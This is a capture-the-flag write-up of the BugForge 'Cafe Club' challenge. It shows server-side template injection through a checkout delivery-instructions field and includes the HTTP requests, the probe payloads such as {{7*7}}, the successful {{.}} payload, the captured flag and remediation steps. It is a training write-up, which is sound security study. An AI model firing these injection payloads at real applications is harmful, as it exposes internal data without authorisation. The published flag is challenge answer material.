# Cafe Club — cafeclub-011 — Make sure you leave some delivery instructions.

## Overview

**Challenge:** Cafe Club  
**Platform:** BugForge  
**Category:** Web Security  
**Vulnerability:** Server-Side Template Injection (SSTI) / Template Context Disclosure

### Challenge Hint

> Make sure you leave some delivery instructions.

The hint points toward the delivery instructions field in the checkout process. The objective was to investigate how the application handled this input and determine whether it could be used to disclose server-side template information.

---

## 1. Reconnaissance

I explored the Cafe Club application and proceeded through the checkout workflow. After adding an item to the cart, I submitted an order with a custom delivery instruction.

The application sent a request to:

```http
POST /api/checkout
```

### Checkout Request

The relevant request body was:

```json
{
  "points_to_use": 0,
  "use_gift_card": false,
  "card_number": "4444 4444 4444 4444",
  "card_expiry": "12/25",
  "card_cvc": "123",
  "delivery_instructions": "F45H1L_TEST_123"
}
```

### Checkout Response

The server returned a successful response:

```json
{
  "message": "Order placed successfully",
  "order_id": 6,
  "total": 8.99,
  "gift_card_used": 0,
  "points_used": 0,
  "points_earned": 8,
  "new_points_balance": 24
}
```

This confirmed that the order was created successfully and provided an order ID for further investigation.

---

## 2. Inspecting the Invoice

After placing the order, I viewed its invoice through the following endpoint:

```http
GET /api/orders/6/invoice
```

The response contained the order details, customer information, total paid, and delivery instructions.

```text
CAFECLUB INVOICE
Order: 6

Customer: Test

1 x Coffee Filters @ €8.99

Total paid: €8.99

Delivery instructions:
F45H1L_TEST_123

Thank you for shopping with CafeClub.
```

The delivery instructions were reflected in the invoice, making this field a potential input point for further testing.

---

## 3. Testing for SSTI

I tested whether the application evaluated expressions supplied through the delivery instructions field.

### Test 1: HTML Injection Probe

**Payload:**

```html
<b>F45H1L_TEST</b>
```

**Observation:** The invoice displayed the HTML tags literally instead of rendering the text in bold.

This did not demonstrate HTML interpretation in the invoice response.

### Test 2: Arithmetic Expression

**Payload:**

```text
{{7*7}}
```

**Observation:** The expression appeared unchanged in the invoice.

The application did not evaluate this arithmetic expression.

### Test 3: Alternative Expression Syntaxes

I tested additional expressions to investigate whether the application used a different template syntax.

```text
${7*7}
#{7*7}
<%= 7*7 %>
{{7+7}}
*{7*7}
```

**Observation:** The expressions were reflected as literal text, without arithmetic evaluation.

These results suggested that conventional arithmetic-based SSTI probes were not suitable for identifying the behavior of this application.

---

## 4. Discovering the Successful Payload

I then tested a template-context expression through the delivery instructions field.

**Payload:**

```text
{{.}}
```

After placing the order and viewing its invoice, the response included the following output:

```text
Delivery instructions: order, customer, billing

Template reference: bug{41BdpmvpsrVL87fBUkeNgDkOquaQU96a}
```

Unlike the earlier tests, this payload caused the application to expose template-related information and reveal the challenge flag.

### Why Did This Work?

The `{{.}}` syntax is associated with Go's `text/template` and `html/template` packages, where the dot represents the current template context.

In contrast, arithmetic expressions such as `{{7*7}}` are not valid Go-template arithmetic expressions in the same way they are in some other template engines.

The observed behavior is consistent with a Go-style template context being evaluated. However, the output alone does not conclusively establish the exact template engine or its implementation.

---

## 5. Flag

The challenge flag obtained from the invoice was:

```text
bug{41BdpmvpsrVL87fBUkeNgDkOquaQU96a}
```

---

## 6. Vulnerability Analysis

| Item | Details |
|---|---|
| Input source | `delivery_instructions` |
| Entry point | `POST /api/checkout` |
| Output endpoint | `GET /api/orders/{id}/invoice` |
| Successful payload | `{{.}}` |
| Observed impact | Disclosure of template-context information and the challenge flag |

The vulnerability is consistent with server-side template injection or unsafe evaluation of user-controlled content in a template context.

The invoice endpoint returning `text/plain` did not prevent the template expression from being processed before the response was generated.

### Security Impact

Depending on the template engine, configuration, and available template context, unsafe template evaluation may expose internal application data. More severe consequences depend on the engine's capabilities and the application's execution environment; they were not established by this test alone.

---

## 7. Remediation

To prevent this class of vulnerability:

1. **Treat user input as data.** Delivery instructions should be inserted as ordinary text rather than interpreted as template source.
2. **Avoid dynamic template construction.** Do not concatenate user-controlled values into template definitions.
3. **Use safe rendering practices.** Pass user input through the template engine's data model and apply appropriate output encoding.
4. **Minimize exposed template context.** Provide templates with only the data they need.
5. **Add regression tests.** Include strings such as `{{.}}` and `{{7*7}}` to verify that user input is preserved as literal text.

---

## 8. Conclusion

The Cafe Club challenge demonstrated the importance of testing template syntax appropriate to the suspected engine.

Initial HTML and arithmetic-expression probes were returned literally. The `{{.}}` payload produced template-context output and exposed the challenge flag, revealing the intended weakness.

The key lesson is to investigate how user-controlled input reaches server-side rendering and to select payloads based on observed application behavior rather than relying exclusively on generic SSTI examples.